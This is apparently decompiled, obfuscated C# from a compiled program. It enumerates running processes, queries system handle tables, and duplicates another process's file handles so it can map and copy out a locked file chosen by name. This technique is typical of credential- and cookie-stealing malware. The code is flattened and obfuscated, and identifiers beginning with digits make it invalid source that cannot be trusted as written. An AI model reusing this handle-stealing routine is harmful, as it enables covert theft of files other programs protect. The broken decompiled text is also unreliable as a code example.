using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace S5j
{
	// Token: 0x02000089 RID: 137
	public class p3H
	{
		// Token: 0x06000251 RID: 593 RVA: 0x0002DCD0 File Offset: 0x0002BED0
		public static byte[] bjUl(string pNGf)
		{
			int num = 0;
			kfA6ep6v kfA6ep6v;
			for (;;)
			{
				if (num == 2)
				{
					if (kfA6ep6v.MPLUjRAIV3 != 0)
					{
						break;
					}
					num = 3;
				}
				if (num == 4)
				{
					break;
				}
				if (num == 1)
				{
					kfA6ep6v = p3H.CyyA6YVk(pNGf, null);
					num = 2;
				}
				if (num == 3)
				{
					goto Block_5;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 5)
				{
					goto Block_7;
				}
			}
			IntPtr hSourceProcessHandle = mPeRk.OpenProcess(37AayiVwbE.bJFd, true, (uint)kfA6ep6v.MPLUjRAIV3);
			IntPtr currentProcess = mPeRk.GetCurrentProcess();
			IntPtr hFile = 0;
			bool flag = mPeRk.DuplicateHandle(hSourceProcessHandle, new IntPtr(kfA6ep6v.g2BMyCPVG), currentProcess, out hFile, 0U, false, tDRvYQBcmK.tY7eOU4);
			if (flag)
			{
				long num2 = 0L;
				mPeRk.GetFileSizeEx(hFile, out num2);
				IntPtr hFileMappingObject = mPeRk.CreateFileMapping(hFile, IntPtr.Zero, pgwITr.xvojLFocbWB, 0U, 0U, null);
				IntPtr source = mPeRk.MapViewOfFile(hFileMappingObject, GPq.qxuYm0, 0U, 0U, 0U);
				byte[] array = new byte[num2];
				Marshal.Copy(source, array, 0, (int)num2);
				return array;
			}
			goto IL_1B9;
			Block_5:
			return null;
			Block_7:
			IL_1B9:
			return null;
		}

		// Token: 0x06000252 RID: 594 RVA: 0x0002DE98 File Offset: 0x0002C098
		public static kfA6ep6v CyyA6YVk(string Fev, string[] RFYrOn27W4 = null)
		{
			int num = 0;
			List<Process>.Enumerator enumerator;
			for (;;)
			{
				if (num != 8)
				{
					goto IL_36;
				}
				Process process;
				if (process.HandleCount != 0)
				{
					num = 9;
					goto IL_36;
				}
				goto IL_226;
				IL_23D:
				if (num == 12)
				{
					goto IL_28C;
				}
				if (num == 6)
				{
					goto IL_3D6;
				}
				if (num == 20)
				{
					goto IL_28C;
				}
				goto IL_2A2;
				IL_3EE:
				if (num == 0)
				{
					num = 1;
				}
				if (num == 22)
				{
					kfA6ep6v result;
					return result;
				}
				continue;
				IL_2A2:
				List<Process> list;
				if (num == 2)
				{
					list = new List<Process>();
					num = 3;
				}
				if (num == 21)
				{
					break;
				}
				if (num != 11)
				{
					goto IL_3EE;
				}
				IL_3D6:
				int num2;
				Process[] processes;
				if (num2 >= processes.Length)
				{
					num = 12;
					goto IL_3EE;
				}
				goto IL_67;
				IL_28C:
				enumerator = list.GetEnumerator();
				num = 21;
				goto IL_2A2;
				IL_7D:
				if (num == 15)
				{
					goto IL_11A;
				}
				if (num == 5)
				{
					num2 = 0;
					num = 6;
				}
				int num3;
				if (num == 14)
				{
					num3 = 0;
					num = 15;
				}
				if (num == 16)
				{
					goto IL_F3;
				}
				goto IL_109;
				IL_132:
				if (num == 18)
				{
					num3++;
					num = 19;
				}
				string processName;
				if (num == 17)
				{
					list.AddRange(Process.GetProcessesByName(processName));
					num = 18;
				}
				if (num == 13)
				{
					goto IL_197;
				}
				IL_1A8:
				if (num == 3)
				{
					if (RFYrOn27W4 != null)
					{
						goto IL_197;
					}
					num = 4;
				}
				if (num == 9)
				{
					list.Add(process);
					num = 10;
				}
				if (num == 4)
				{
					processes = Process.GetProcesses();
					num = 5;
				}
				if (num == 10)
				{
					goto IL_226;
				}
				goto IL_23D;
				IL_197:
				num = 14;
				goto IL_1A8;
				IL_109:
				if (num != 19)
				{
					goto IL_132;
				}
				IL_11A:
				if (num3 >= RFYrOn27W4.Length)
				{
					num = 20;
					goto IL_132;
				}
				IL_F3:
				processName = RFYrOn27W4[num3];
				num = 17;
				goto IL_109;
				IL_36:
				if (num == 1)
				{
					new Dictionary<int, string>();
					num = 2;
				}
				if (num == 7)
				{
					goto IL_67;
				}
				goto IL_7D;
				IL_226:
				num2++;
				num = 11;
				goto IL_23D;
				IL_67:
				process = processes[num2];
				num = 8;
				goto IL_7D;
			}
			try
			{
				while (enumerator.MoveNext())
				{
					Process process2 = enumerator.Current;
					Dictionary<int, string> dictionary = p3H.5g3sEA2ZJj(process2.Id);
					foreach (KeyValuePair<int, string> keyValuePair in dictionary)
					{
						if (keyValuePair.Value.EndsWith(Fev, StringComparison.CurrentCultureIgnoreCase))
						{
							return new kfA6ep6v(process2.ProcessName, process2.Id, keyValuePair.Value, keyValuePair.Key);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator).Dispose();
			}
			return default(kfA6ep6v);
		}

		// Token: 0x06000253 RID: 595 RVA: 0x0002E2EC File Offset: 0x0002C4EC
		public static Dictionary<string, string> jIMF6ZFMf()
		{
			int num = 0;
			Dictionary<string, string> dictionary;
			for (;;)
			{
				StringBuilder stringBuilder;
				if (num == 4)
				{
					stringBuilder = new StringBuilder(260);
					num = 5;
				}
				if (num == 8)
				{
					goto IL_47;
				}
				IL_5D:
				if (num == 13)
				{
					goto IL_6E;
				}
				IL_86:
				string[] logicalDrives;
				string[] array;
				if (num == 5)
				{
					array = logicalDrives;
					num = 6;
				}
				string text;
				if (num == 10)
				{
					mPeRk.QueryDosDevice(text, stringBuilder, 260U);
					num = 11;
				}
				if (num == 2)
				{
					logicalDrives = Environment.GetLogicalDrives();
					num = 3;
				}
				string text3;
				int num2;
				if (num != 7)
				{
					if (num == 14)
					{
						string text2;
						dictionary.Add(text2.Substring(0, text2.Length - 1), "\\");
						num = 15;
					}
					if (num == 9)
					{
						text = text3.Substring(0, 2);
						num = 10;
					}
					if (num == 1)
					{
						string text2 = "\\Device\\LanmanRedirector\\";
						num = 2;
					}
					if (num == 6)
					{
						num2 = 0;
						num = 7;
					}
					if (num == 12)
					{
						num2++;
						num = 13;
					}
					if (num == 11)
					{
						dictionary.Add(p3H.bOSbZsVDo(stringBuilder.ToString()), text);
						num = 12;
					}
					if (num == 3)
					{
						dictionary = new Dictionary<string, string>(logicalDrives.Length);
						num = 4;
					}
					if (num == 0)
					{
						num = 1;
					}
					if (num == 15)
					{
						break;
					}
					continue;
				}
				IL_6E:
				if (num2 >= array.Length)
				{
					num = 14;
					goto IL_86;
				}
				IL_47:
				text3 = array[num2];
				num = 9;
				goto IL_5D;
			}
			return dictionary;
		}

		// Token: 0x06000254 RID: 596 RVA: 0x0002E598 File Offset: 0x0002C798
		public static string bOSbZsVDo(string pqtDgy79dn)
		{
			int num = 0;
			string text;
			string str;
			for (;;)
			{
				if (num == 1)
				{
					text = "\\Device\\LanmanRedirector\\";
					num = 2;
				}
				if (num == 4)
				{
					break;
				}
				if (num == 2)
				{
					if (string.Compare(pqtDgy79dn, 0, text, 0, text.Length, StringComparison.InvariantCulture) != 0)
					{
						return pqtDgy79dn;
					}
					num = 3;
				}
				if (num == 3)
				{
					str = pqtDgy79dn.Substring(pqtDgy79dn.IndexOf('\\', text.Length) + 1);
					num = 4;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 5)
				{
					return pqtDgy79dn;
				}
			}
			return text + str;
		}

		// Token: 0x06000255 RID: 597 RVA: 0x0002E6C8 File Offset: 0x0002C8C8
		public static Dictionary<int, string> p3IbyLQn(Dictionary<int, string> ARPFz1FQ)
		{
			int num = 0;
			Dictionary<int, string> dictionary;
			Dictionary<int, string>.Enumerator enumerator;
			do
			{
				if (num == 1)
				{
					dictionary = new Dictionary<int, string>();
					num = 2;
				}
				if (num == 2)
				{
					enumerator = ARPFz1FQ.GetEnumerator();
					num = 3;
				}
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 3);
			try
			{
				while (enumerator.MoveNext())
				{
					KeyValuePair<int, string> keyValuePair = enumerator.Current;
					Dictionary<string, string> dictionary2 = p3H.jIMF6ZFMf();
					int num2 = keyValuePair.Value.Length;
					while (num2 > 0 && (num2 = keyValuePair.Value.LastIndexOf('\\', num2 - 1)) != -1)
					{
						string str;
						if (dictionary2.TryGetValue(keyValuePair.Value.Substring(0, num2), out str))
						{
							dictionary.Add(keyValuePair.Key, str + keyValuePair.Value.Substring(num2));
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator).Dispose();
			}
			return dictionary;
		}

		// Token: 0x06000256 RID: 598 RVA: 0x0002E85C File Offset: 0x0002CA5C
		public static Dictionary<int, string> 5g3sEA2ZJj(int bGs2)
		{
			int num = 0;
			Dictionary<int, string> dictionary;
			int num2;
			for (;;)
			{
				if (num == 1)
				{
					dictionary = new Dictionary<int, string>();
					num = 2;
				}
				if (num == 3)
				{
					IntPtr intPtr = IntPtr.Zero;
					num = 4;
				}
				if (num == 2)
				{
					num2 = 65536;
					num = 3;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 4)
				{
					goto Block_5;
				}
			}
			Block_5:
			goto IL_AD;
			try
			{
				IntPtr intPtr;
				ON8D3pP on8D3pP;
				for (;;)
				{
					IL_AD:
					intPtr = Marshal.AllocHGlobal(num2);
					int val;
					on8D3pP = tdoQ9YzIIP.NtQuerySystemInformation(2hQd.EDFkUi, intPtr, num2, out val);
					if (on8D3pP != ON8D3pP.F0h)
					{
						break;
					}
					num2 = Math.Max(num2, val);
					Marshal.FreeHGlobal(intPtr);
					intPtr = IntPtr.Zero;
				}
				if (on8D3pP != ON8D3pP.eHz6)
				{
					throw new Exception("Failed to retrieve system handle information.");
				}
				long num3 = intPtr.ToInt64();
				num3 += (long)IntPtr.Size;
				int num4 = Marshal.SizeOf(typeof(DTdytb808Dv));
				int num5 = (IntPtr.Size == 4) ? Marshal.ReadInt32(intPtr) : ((int)Marshal.ReadInt64(intPtr));
				IntPtr intPtr2 = mPeRk.OpenProcess(37AayiVwbE.bJFd, true, (uint)bGs2);
				IntPtr currentProcess = mPeRk.GetCurrentProcess();
				for (int i = 0; i < num5; i++)
				{
					if (Marshal.ReadInt32((IntPtr)num3) == bGs2)
					{
						DTdytb808Dv dtdytb808Dv = (DTdytb808Dv)Marshal.PtrToStructure(new IntPtr(num3), typeof(DTdytb808Dv));
						int num6 = 0;
						IntPtr intPtr3 = 0;
						bool flag = mPeRk.DuplicateHandle(intPtr2, new IntPtr((int)dtdytb808Dv.2idgiIH), currentProcess, out intPtr3, 0U, false, tDRvYQBcmK.tY7eOU4);
						if (mPeRk.GetFileType(intPtr3) == y0EBGg.WqPhEJoH && flag)
						{
							int num7 = 512;
							IntPtr intPtr4 = Marshal.AllocHGlobal(num7);
							if (tdoQ9YzIIP.NtQueryObject(intPtr3, LaoL2fI5.oMJySrOtmPL, intPtr4, num7, out num6) == ON8D3pP.eHz6)
							{
								1n6cR 1n6cR = (1n6cR)Marshal.PtrToStructure(intPtr4, typeof(1n6cR));
								if (!string.IsNullOrEmpty(1n6cR.m2aeBTP.ToString()) && !string.IsNullOrEmpty(1n6cR.m2aeBTP.ToString().Trim()))
								{
									dictionary.Add((int)dtdytb808Dv.2idgiIH, 1n6cR.m2aeBTP.ToString().Trim());
								}
							}
							Marshal.FreeHGlobal(intPtr4);
						}
						mPeRk.CloseHandle(intPtr3);
					}
					num3 += (long)num4;
				}
				mPeRk.CloseHandle(intPtr2);
			}
			finally
			{
				IntPtr intPtr;
				if (intPtr != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(intPtr);
				}
			}
			return p3H.p3IbyLQn(dictionary);
		}
	}
}
